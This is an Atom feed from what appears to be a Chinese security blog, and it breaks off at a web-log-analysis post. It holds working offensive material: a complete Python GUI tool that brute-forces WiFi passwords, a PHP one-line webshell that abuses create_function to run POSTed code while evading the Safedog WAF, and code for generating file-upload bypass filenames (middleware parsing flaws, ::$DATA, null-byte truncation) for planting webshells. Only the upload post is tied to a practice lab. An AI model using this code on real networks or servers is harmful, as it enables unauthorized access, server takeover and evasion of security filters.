<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一次就好</title>
  
  <subtitle>一次就好</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://black0saturday.github.io/"/>
  <updated>2020-04-17T00:37:44.063Z</updated>
  <id>http://black0saturday.github.io/</id>
  
  <author>
    <name>布布f</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>kali2020-amd64-virtualbox</title>
    <link href="http://black0saturday.github.io/2020/04/16/kali2020-amd64-virtualbox/"/>
    <id>http://black0saturday.github.io/2020/04/16/kali2020-amd64-virtualbox/</id>
    <published>2020-04-16T07:45:07.000Z</published>
    <updated>2020-04-17T00:37:44.063Z</updated>
    
    <content type="html"><![CDATA[<p>Kali2020用Virtual Box安装好的OVA文件（把文件导入Virtual Box可直接使用）<br><a id="more"></a></p><p>内容包括：</p><ol><li>中科大源，并且已更新过</li><li>中文输入法</li><li>时区已设为上海，同步标准时间</li></ol><pre><code>链接：https://pan.baidu.com/s/1vTxkA-9kv_nCTPTNwYN8Xw 提取码：z9uq</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Kali2020用Virtual Box安装好的OVA文件（把文件导入Virtual Box可直接使用）&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>python脚本破解wifi密码</title>
    <link href="http://black0saturday.github.io/2020/04/15/python%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/"/>
    <id>http://black0saturday.github.io/2020/04/15/python脚本破解wifi密码/</id>
    <published>2020-04-15T04:56:19.000Z</published>
    <updated>2020-04-16T07:07:19.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Python丰富的第三方库中自然也包括wifi的API，可以很方便的实现wifi的连接。如果有一份详细的密码本，可以实现wifi密码的暴力破解，前提是你有足够的耐心和时间去等待。</p><a id="more"></a><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>对给定的wifi名称，我们循环使用密码去一一做尝试，如果失败就断开连接，直到连接成功为止。</p><p>即导入所需要的第三方库（请自行下载安装好），通过 pywifi 调用网卡接口，依次做测试，循环读取密码尝试连接。在这里只需要修改密码文件路径和wifi名称即可。</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><blockquote><p>python3.8<br><br>模块： pywifi<br><br>wifi密码字典<br></p></blockquote><h1 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h1><pre><code>from pywifi import *</code></pre><h1 id="字典准备"><a href="#字典准备" class="headerlink" title="字典准备"></a>字典准备</h1><p>随机搞的wifi弱口令TOP10。一行只包含一组密码，脚本依次读取每行密码，直到找到正确的密码为止。</p><p><img src="/2020/04/15/python%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/1.png" alt></p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre><code>from tkinter import *from tkinter import ttkimport pywififrom pywifi import constimport timeimport tkinter.filedialogimport tkinter.messageboxclass MY_GUI():    def __init__(self, init_window_name):        self.init_window_name = init_window_name        # 密码文件路径        self.get_value = StringVar()        # 获取破解wifi账号        self.get_wifi_value = StringVar()        # 获取wifi密码        self.get_wifimm_value = StringVar()        self.wifi = pywifi.PyWiFi()  # 抓取网卡接口        self.iface = self.wifi.interfaces()[0]   # 抓取第一个无线网卡        self.iface.disconnect()  # 测试链接断开所有链接        time.sleep(1)  # 休眠1秒        # 测试网卡是否属于断开状态        assert self.iface.status() in\               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]    def __str__(self):        return &apos;(WIFI:%s,%s)&apos; % (self.wifi, self.iface.name())    # 设置窗口    def set_init_window(self):        self.init_window_name.title(&quot;WIFI破解工具&quot;)        self.init_window_name.geometry(&apos;+500+200&apos;)        labelframe = LabelFrame(width=400, height=200, text=&quot;配置&quot;)        labelframe.grid(column=0, row=0, padx=10, pady=10)        self.search = Button(labelframe, text=&quot;搜索附近WiFi&quot;, command=self.scans_wifi_list).grid(column=0, row=0)        self.pojie = Button(labelframe, text=&quot;开始破解&quot;, command=self.readPassWord).grid(column=1, row=0)        self.label = Label(labelframe, text=&quot;目录路径：&quot;).grid(column=0, row=1)        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)        self.file = Button(labelframe, text=&quot;添加密码文件目录&quot;, command=self.add_mm_file).grid(column=2, row=1)        self.wifi_text = Label(labelframe, text=&quot;WiFi账号：&quot;).grid(column=0, row=2)        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)        self.wifi_mm_text = Label(labelframe, text=&quot;WiFi密码：&quot;).grid(column=2, row=2)        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2, sticky=W)        self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)        # 定义树形结构与滚动条        self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show=&quot;headings&quot;,columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)        self.wifi_tree.configure(yscrollcommand=self.vbar.set)        # 表格的标题        self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)        self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)        self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)        self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)        self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)        self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)        self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)        self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)        self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;, self.onDBClick)        self.vbar.grid(row=4, column=1, sticky=NS)    # 搜索wifi    def scans_wifi_list(self):  # 扫描周围wifi列表        # 开始扫描        print(&quot;^_^ 开始扫描附近wifi...&quot;)        self.iface.scan()        time.sleep(15)        # 在若干秒后获取扫描结果        scanres = self.iface.scan_results()        # 统计附近被发现的热点数量        nums = len(scanres)        print(&quot;数量: %s&quot;% (nums))        # 实际数据        self.show_scans_wifi_list(scanres)        return scanres    # 显示wifi列表    def show_scans_wifi_list(self,scans_res):        for index,wifi_info in enumerate(scans_res):            self.wifi_tree.insert(&quot;&quot;, &apos;end&apos;, values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))    # 添加密码文件目录    def add_mm_file(self):        self.filename = tkinter.filedialog.askopenfilename()        self.get_value.set(self.filename)    # Treeview绑定事件    def onDBClick(self, event):        self.sels= event.widget.selection()        self.get_wifi_value.set(self.wifi_tree.item(self.sels, &quot;values&quot;)[1])    # 读取密码字典，进行匹配    def readPassWord(self):        self.getFilePath = self.get_value.get()        self.get_wifissid = self.get_wifi_value.get()        self.pwdfilehander=open(self.getFilePath, &quot;r&quot;, errors=&quot;ignore&quot;)        while True:            try:                self.pwdStr =self.pwdfilehander.readline()                if not self.pwdStr:                    break                self.bool1=self.connect(self.pwdStr, self.get_wifissid)                if self.bool1:                    self.res = &quot;===正确===  wifi名:%s  匹配密码：%s &quot; % (self.get_wifissid, self.pwdStr)                    self.get_wifimm_value.set(self.pwdStr)                    tkinter.messagebox.showinfo(&apos;提示&apos;, &apos;破解成功！！！&apos;)                    print(self.res)                    break                else:                    self.res = &quot;---错误--- wifi名:%s匹配密码：%s&quot; % (self.get_wifissid, self.pwdStr)                    print(self.res)                    sleep(3)            except:                continue    # 对wifi和密码进行匹配    def connect(self, pwd_Str, wifi_ssid):        # 创建wifi链接文件        self.profile = pywifi.Profile()        self.profile.ssid = wifi_ssid  # wifi名称        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法        self.profile.cipher = const.CIPHER_TYPE_CCMP    # 加密单元        self.profile.key = pwd_Str  # 密码        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件        self.iface.connect(self.tmp_profile)  # 链接        time.sleep(5)        if self.iface.status() == const.IFACE_CONNECTED:   # 判断是否连接上            isOK=True        else:            isOK=False        self.iface.disconnect()  # 断开        time.sleep(1)        # 检查断开状态        assert self.iface.status() in\            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]        return isOKdef gui_start():    init_window = Tk()    ui = MY_GUI(init_window)    print(ui)    ui.set_init_window()    init_window.mainloop()gui_start()</code></pre><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>运行结果如下图所示，你按照图形界面的操作，便能开始跑起来了。<br><img src="/2020/04/15/python%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Python丰富的第三方库中自然也包括wifi的API，可以很方便的实现wifi的连接。如果有一份详细的密码本，可以实现wifi密码的暴力破解，前提是你有足够的耐心和时间去等待。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://black0saturday.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>过狗一句话编写</title>
    <link href="http://black0saturday.github.io/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/"/>
    <id>http://black0saturday.github.io/2020/04/13/过狗一句话编写/</id>
    <published>2020-04-13T04:12:54.000Z</published>
    <updated>2020-04-14T04:51:09.589Z</updated>
    
    <content type="html"><![CDATA[<p>安全狗查杀一句话的时候，通常检测eval 和 $_POST[x]有没有同时出现，正常的POST数据不拦截，然后我们将POST来的数据放到存在代码执行漏洞的函数中，这样，POST来的数据就被执行了。<br><a id="more"></a></p><p>因此就想着试一试.选择的函数是create_function函数，create_function函数接收两个参数$args 和 $code 然后组成新函数function_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行了。</p><h3 id="构造-code"><a href="#构造-code" class="headerlink" title="构造$code"></a>构造$code</h3><p>$code = “n;}$_POST[x];/*”;</p><p>解释一下构造的$code:</p><ul><li>双引号中$_POST[x]被执行(这里以提交x=phpinfo();为例)</li><li>;来结束语句</li><li>}来结束函数体</li></ul><p>phpinfo();;就在函数体外面被eval执行了</p><p>/*注释多余的代码</p><p>最终代码：<code>eval(function_lambda_func($args){n;}phpinfo();;/*})</code></p><p>那么phpinfo()就被执行了.</p><p>如图：<br><img src="/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/1.png" alt><br>过狗测试：<br><img src="/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/2.png" alt></p><p>最终代码：</p><pre><code>&lt;?php     $args = &quot;tony&quot;;    $code = &quot;n;}$_POST[x];/*&quot;;    echo create_function(&apos;$args&apos;,$code);?&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安全狗查杀一句话的时候，通常检测eval 和 $_POST[x]有没有同时出现，正常的POST数据不拦截，然后我们将POST来的数据放到存在代码执行漏洞的函数中，这样，POST来的数据就被执行了。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>构造优质上传漏洞Fuzz字典</title>
    <link href="http://black0saturday.github.io/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/"/>
    <id>http://black0saturday.github.io/2020/04/11/构造优质上传漏洞Fuzz字典/</id>
    <published>2020-04-11T02:32:34.000Z</published>
    <updated>2020-04-11T03:27:48.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>本文转自FreeBuf</strong><br>上传漏洞的利用姿势很多，同时也会因为语言，中间件，操作系统的不同，利用也不同。比如有：大小写混合，.htaccess，解析漏洞，00截断，.绕过，空格绕过，::$DATA绕过，以及多种姿势的组合等等。当遇到一个上传点，如何全面的利用以上姿势测试一遍，并快速发现可以成功上传webshell的姿势？</p><a id="more"></a><h2 id="方案一：-一个一个手工测试"><a href="#方案一：-一个一个手工测试" class="headerlink" title="方案一： 一个一个手工测试"></a>方案一： 一个一个手工测试</h2><p>手工把所有姿势测试一遍，先不说花费大量时间，还很可能会遗漏掉某些姿势而导致无法利用成功。</p><h2 id="方案二：fuzz"><a href="#方案二：fuzz" class="headerlink" title="方案二：fuzz"></a>方案二：fuzz</h2><p>在fuzz时我们往往会给一个输入点喂入大量特殊的数据。这个特殊的数据可能随机的，毫无规律的，甚至我们都无法预知的。但我思考了一下，这样的fuzz方式只是适合在本地fuzz 0day漏洞，并不适合通过fuzz在线网站的上传点，快速找出可以成功上传webshell的payload，因为时间成本排在哪里。</p><p>通过思考，我们可以知道如果能根据上传漏洞的场景（后端语言，中间件，操作系统）来生成优质的fuzz字典，然后使用该字典进行fuzz，就能消除以上两个解决方案的弊端！</p><h2 id="一、构想"><a href="#一、构想" class="headerlink" title="一、构想"></a>一、构想</h2><p>在动手之前我们来思考下上传漏洞跟那些因素有关：</p><blockquote><p>1.可解析的后缀，也就是该语言有多个可解析的后缀，比如php语言可解析的后缀为php,php2,php3等等<br><br>2.大小写混合，如果系统过滤不严，可能大小写可以绕过。<br><br>3.中间件，每款中间件基本都解析漏洞,比如IIS就可以把xxx.asp;.jpg当asp来执行。<br><br>4.系统特性，特别是Windows的后缀加点（.）,加空格，加::$DATA可以绕过目标系统。<br><br>5.语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。<br><br>6.双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。<br></p></blockquote><p>整理以上思考，我们把生成字典的规则梳理为以下几条：</p><blockquote><ol><li>可解析的后缀+大小写混合</li><li>可解析的后缀+大小写混合+中间件漏洞</li><li>.htaccess + 大小写混合</li><li>可解析的后缀+大小写混合+系统特性</li><li>可解析的后缀+大小写混合+语言漏洞</li><li>可解析的后缀+大小写混合+双后缀</li></ol></blockquote><p>下面我们根据上面的构想，来分析每一方面的细节，并使用代码来实现。</p><h2 id="二、-可解析后缀"><a href="#二、-可解析后缀" class="headerlink" title="二、 可解析后缀"></a>二、 可解析后缀</h2><p>其实很多语言都这样，有多个可以解析后缀。当目标站点采用黑名单时，往往包含不全。以下我收集相对比较全面的可解析后缀，为后面生成字典做材料。</p><p><img src="/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/1.png" alt></p><h2 id="三、-大小写混合"><a href="#三、-大小写混合" class="headerlink" title="三、 大小写混合"></a>三、 大小写混合</h2><p>有些网站过滤比较简单，只是过滤了脚本后缀，但是没有对后缀进行统一转换为小写，在进行判断。这就存在一个大小写问题。这里我们可以编写两个函数，一个函数是传入一个字符串，函数返回该字符串所有大小写组合的可能，第二个函数是基于第一个函数，把一个list的传入返回一个list内所有字符的所有大小写组合的可能。</p><h2 id="字符串大小写混合，返回字符串所有大写可能"><a href="#字符串大小写混合，返回字符串所有大写可能" class="headerlink" title="字符串大小写混合，返回字符串所有大写可能"></a>字符串大小写混合，返回字符串所有大写可能</h2><pre><code>def str_case_mixing(word):    str_list = []    word = word.lower()    tempWord = copy.deepcopy(word)    plist = []    redict = {}    for char in range( len( tempWord ) ):        char = word[char]        plist.append(char)     num = len( plist )    for i in range( num ):        for j in range( i , num + 1 ):            sContent = &apos;&apos;.join( plist[0:i] )            mContent = &apos;&apos;.join( plist[i:j] )            mContent = mContent.upper()            eContent = &apos;&apos;.join( plist[j:] )            content = &apos;&apos;&apos;%s%s%s&apos;&apos;&apos; % (sContent,mContent,eContent)            redict[content] = None    for i in redict.keys():        str_list.append(i)    return str_list## list大小写混合def list_case_mixing(li):    res = []    for l in li:        res += uperTest(l)    return res</code></pre><h2 id="四、-中间件漏洞"><a href="#四、-中间件漏洞" class="headerlink" title="四、 中间件漏洞"></a>四、 中间件漏洞</h2><p>这块是比较复杂的一块。首先我们先来梳理下</p><h3 id="4-1-IIS"><a href="#4-1-IIS" class="headerlink" title="4.1 IIS"></a>4.1 IIS</h3><p>IIs一共有三个解析漏洞：</p><ol><li>IIS6.0文件解析 xx.asp;.jpg2.IIS6.0目录解析 xx.asp/1.jpg3.IIS 7.0畸形解析 xxx.jpg/x.asp</li></ol><p>由于2和3和上传的文件名无关，故我们只根据1来生成fuzz字典</p><pre><code>def iis_suffix_creater(suffix):    res = []    for l in suffix:        str =&apos;%s;.%s&apos; % (l,allow_suffix)        res.append(str)    return res</code></pre><h3 id="4-2-apache"><a href="#4-2-apache" class="headerlink" title="4.2 apache"></a>4.2 apache</h3><p>apache相关的解析漏洞有两个：</p><ol><li>%0a(CVE-2017-15715)</li><li>未知后缀 test.php.xxx</li></ol><p>根据以上构造<code>apache_suffix_builder</code>函数生成规则：</p><pre><code>def apache_suffix_creater(suffix):    res = []    for l in suffix:        str = &apos;%s.xxx&apos; % l        res.append(str)        str = &apos;%s%s&apos; % (l,urllib.unquote(&apos;%0a&apos;)) #CVE-2017-15715        res.append(str)    return res</code></pre><h3 id="4-3-nginx"><a href="#4-3-nginx" class="headerlink" title="4.3 nginx"></a>4.3 nginx</h3><p>nginx解析漏洞有三个：</p><ol><li>访问连接加/xxx.php test.jpg/xxx.php</li><li>畸形解析漏洞 test.jpg%00xxx.php</li><li>CVE-2013-4547 test.jpg(非编码空格)\0x.php</li></ol><p>nginx的解析漏洞，由于和上传的文件名无关，故生成字典无需考虑。</p><h3 id="4-4-tomcat"><a href="#4-4-tomcat" class="headerlink" title="4.4 tomcat"></a>4.4 tomcat</h3><p>tomcat用于上传绕过的有三种,不过限制在windows操作系统下。</p><pre><code>xxx.jsp/xxx.jspxxx.jsp::$DATA</code></pre><p>根据以上规则生成字典对应的代码为：</p><pre><code>win_tomcat = [&apos;%20&apos;,&apos;::$DATA&apos;,&apos;/&apos;]def tomcat_suffix_creater(suffix):    res = []    for l in suffix:        for t in win_tomcat:            str = &apos;%s%s&apos; % (l,t)            res.append(str)    return res</code></pre><p>如果确定中间件为apache,可以加入.htaccess。同时如果操作系统还为windows，我们可以大小写混合。</p><pre><code>if (middleware == &apos;apache&apos; or middleware == &apos;all&apos;) and (os == &apos;win&apos; or os == &apos;all&apos;):    htaccess_suffix = uperTest(&quot;.htaccess&quot;)elif (middleware == &apos;apache&apos; or middleware == &apos;all&apos;) and os == &apos;linux&apos;:    htaccess_suffix = [&apos;.htaccess&apos;]else:    htaccess_suffix = []</code></pre><h3 id="4-5-语言，中间件与操作系统的关系"><a href="#4-5-语言，中间件与操作系统的关系" class="headerlink" title="4.5 语言，中间件与操作系统的关系"></a>4.5 语言，中间件与操作系统的关系</h3><p>以上我们根据每个中间件的漏洞，编写了对应的fuzz字典生成函数。在最终生成字典时，我们还要考虑中间件可以运行那些语言，以及它们与平台的关系。</p><p><img src="/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/2.png" alt></p><p>根据上表，我们明白：</p><p>iis下可以运行asp/aspx,php,jsp脚本，故这3种脚本语言可解析后缀均应该传入iis_suffix_builder()进行处理；</p><p>apache下可以运行asp/aspx,php。故这2两种脚本语言可解析后缀均应该传入apache_suffix_builder()进行处理；</p><p>tomcat下可以运行php，jsp，故这两个脚本语言可解析后缀均应该传入tomcat_suffix_builder()进行处理。</p><p>注意：根据对tomcat上传的绕过分析，发现之后在windows平台下才能成功。故之后在Windows平台下才会调用<code>tomcat_suffix_builder()</code>对可解析后缀进行处理。</p><p>故伪代码可以编写如下：</p><pre><code>if middleware == &apos;iis&apos;:    case_asp_php_jsp_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_jsp_parse_suffix    middleware_parse_suffix = iis_suffix_creater(case_asp_php_jsp_parse_suffix)elif middleware == &apos;apache&apos;:    case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix    middleware_parse_suffix = apache_suffix_creater(case_asp_php_html_parse_suffix)elif middleware == &apos;tomcat&apos; and os == &apos;linux&apos;:    middleware_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffixelif middleware == &apos;tomcat&apos; and (os == &apos;win&apos; or os == &apos;all&apos;):    case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix    middleware_parse_suffix = tomcat_suffix_creater(case_php_jsp_parse_suffix)else:    case_asp_php_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix    iis_parse_suffix = iis_suffix_creater(case_asp_php_parse_suffix)    case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix    apache_parse_suffix = apache_build(case_asp_php_html_parse_suffix)    case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix    tomcat_parse_suffix = tomcat_build(case_php_jsp_parse_suffix)            middleware_parse_suffix = iis_parse_suffix + apache_parse_suffix + tomcat_parse_suffix</code></pre><h2 id="五、-系统特性"><a href="#五、-系统特性" class="headerlink" title="五、 系统特性"></a>五、 系统特性</h2><p>经过查资料，目前发现在系统层面，有以下特性可以被上传漏洞所利用。</p><p>Windows下文件名不区分大小写，Linux下文件名区分大写欧西；</p><p>Windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php；</p><p>Windows下文件名结尾加入<code>.</code>,<code>空格</code>,<code>&lt;</code>,<code>·`</code>&gt;<code>,</code>&gt;&gt;&gt;<code>,</code>0x81-0xff`等字符，最终生成的文件均被windows忽略。</p><pre><code># 生成0x81-0xff的字符listdef str_81_to_ff():    res = []    for i in range(129,256):        str = &apos;%x&apos; % i        str = &apos;%&apos; + str        str = urllib.unquote(str)        res.append(str)    return reswindows_os = [&apos; &apos;,&apos;.&apos;,&apos;/&apos;,&apos;::$DATA&apos;,&apos;&lt;&apos;,&apos;&gt;&apos;,&apos;&gt;&gt;&gt;&apos;,&apos;%20&apos;,&apos;%00&apos;] + str_81_to_ff()def windows_suffix_builder(suffix):    res = []    for s in suffix:        for w in windows_os:            str = &apos;%s%s&apos; % (s,w)            res.append(str)    return res</code></pre><h2 id="六、-语言的漏洞"><a href="#六、-语言的漏洞" class="headerlink" title="六、 语言的漏洞"></a>六、 语言的漏洞</h2><p>语言漏洞被利用于上传的有%00截断和0x00截断。它们在asp，php和jsp中都存在着。</p><pre><code>def str_00_truncation(suffix,allow_suffix):    res = []    for i in suffix:        str = &apos;%s%s.%s&apos; % (i,&apos;%00&apos;,allow_suffix)        res.append(str)        str = &apos;%s%s.%s&apos; % (i,urllib.unquote(&apos;%00&apos;),allow_suffix)        res.append(str)    return res</code></pre><h2 id="七、-双后缀"><a href="#七、-双后缀" class="headerlink" title="七、 双后缀"></a>七、 双后缀</h2><p>有些站点通过对上传文件名进行删除敏感字符（php,asp,jsp等等）的方式进行过滤,例如你上传一个aphp.jpg的文件，那么上传之后就变成了a.jpg。这时就可以利用双后缀的方式上传一个a.pphphp,最终正好生成a.php。其实双后缀与中间件和操作系统无关，而是和代码逻辑有关。</p><p>针对双后缀，我们可以写个str_double_suffix_creater(suffix)函数，传入后缀名suffix即可生成所有的双后缀可能。</p><pre><code>def str_double_suffix_creater(suffix):    res = []    for i in range(1,len(suffix)):        str = list(suffix)        str.insert(i,suffix)        res.append(&quot;&quot;.join(str))    return res</code></pre><p>在<code>list_double_suffix_creater(suffix)</code>函数基础上，可以编写<code>list_double_suffix_creater(list_suffix)</code>来为一个list生成所有双后缀可能。</p><pre><code>def list_double_suffix_creater(list_suffix):    res = []    for l in list_suffix:        res += double_suffix_creater(l)    return duplicate_removal(res)</code></pre><h2 id="八、-整合代码"><a href="#八、-整合代码" class="headerlink" title="八、 整合代码"></a>八、 整合代码</h2><p>上面我们针对和上传漏洞相关的每个方面进行了细致的分析，也提供了相关的核心代码。最终整合后的代码限于边幅，就放在github上了。<br><a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a></p><pre><code>$ python upload-fuzz-dic-builder.py -husage: upload-fuzz-dic-builder [-h] [-n] [-a] [-l] [-m] [--os] [-d] [-o]optional arguments:  -h, --help            show this help message and exit  -n , --upload-filename                        Upload file name  -a , --allow-suffix   Allowable upload suffix  -l , --language       Uploaded script language  -m , --middleware     Middleware used in Web System  --os                  Target operating system type  -d, --double-suffix   Is it possible to generate double suffix?  -o , --output         Output file</code></pre><p>脚本可以之定义生成的上传文件名（-n），允许的上传的后缀（-a），后端语言（-l），中间件(-m),操作系统（—os），是否加入双后缀（-d）以及输出的字典文件名（-o）。我们可以根据场景来生成合适的字典，提供的信息越详细，脚本生成的字典越精确。</p><h2 id="九、案例"><a href="#九、案例" class="headerlink" title="九、案例"></a>九、案例</h2><p>upload-labs靶场的Pass-03到Pass-10其实都是关于后缀的，在不知道代码的情况下，我们如何快速发现可以绕过的后缀呢？这时我们就可以使用upload-fuzz-dic-builder.py脚本生成fuzz字典，来进行fuzz。这里我选择Pass-09来给大家演示。</p><h3 id="1-利用脚本生成Fuzz字典"><a href="#1-利用脚本生成Fuzz字典" class="headerlink" title="1.利用脚本生成Fuzz字典"></a>1.利用脚本生成Fuzz字典</h3><p>由于知道我们的后端语言为php,中间件为apache，操作系统为Windows。所以可以利用这些信息生成更精确的fuzz字典。</p><pre><code>$ python upload-fuzz-dic-builder.py -l php -m apache --os win[+] 收集17条可解析后缀完毕！[+] 加入145条可解析后缀大小写混合完毕！[+] 加入152条中间件漏洞完毕！[+] 加入37条.htaccess完毕！[+] 加入10336条系统特性完毕！[+] 去重后共10753条数据写入upload_fuzz_dic.txt文件</code></pre><p><img src="/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/3.png" alt></p><h3 id="2-抓包使用burp的Intruder模块对上传名称进行fuzz"><a href="#2-抓包使用burp的Intruder模块对上传名称进行fuzz" class="headerlink" title="2.抓包使用burp的Intruder模块对上传名称进行fuzz"></a>2.抓包使用burp的Intruder模块对上传名称进行fuzz</h3><p>抓取upload-labs的Pass-09的上传包，发送到Intruder模块，加载第一步脚本生成的fuzz字典，对上传的包的文件名进行fuzz。</p><p><img src="/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/4.png" alt><br>经过测试，通过fuzz可以快速找到可以突破upload-labs那些基于后缀的Pass的payload。甚至fuzz出同一个Pass多种绕过的方法。</p><p><a href="https://www.freebuf.com/articles/web/188464.html" target="_blank" rel="noopener" title="本文作者：gv·残亦，本文属于FreeBuf原创奖励计划，未经许可禁止转载">https://www.freebuf.com/articles/web/188464.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;本文转自FreeBuf&lt;/strong&gt;&lt;br&gt;上传漏洞的利用姿势很多，同时也会因为语言，中间件，操作系统的不同，利用也不同。比如有：大小写混合，.htaccess，解析漏洞，00截断，.绕过，空格绕过，::$DATA绕过，以及多种姿势的组合等等。当遇到一个上传点，如何全面的利用以上姿势测试一遍，并快速发现可以成功上传webshell的姿势？&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>分析web日志</title>
    <link href="http://black0saturday.github.io/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/"/>
    <id>http://black0saturday.github.io/2020/04/09/分析web日志/</id>
    <published>2020-04-09T09:35:44.000Z</published>
    <updated>2020-04-10T10:12:55.051Z</updated>
    
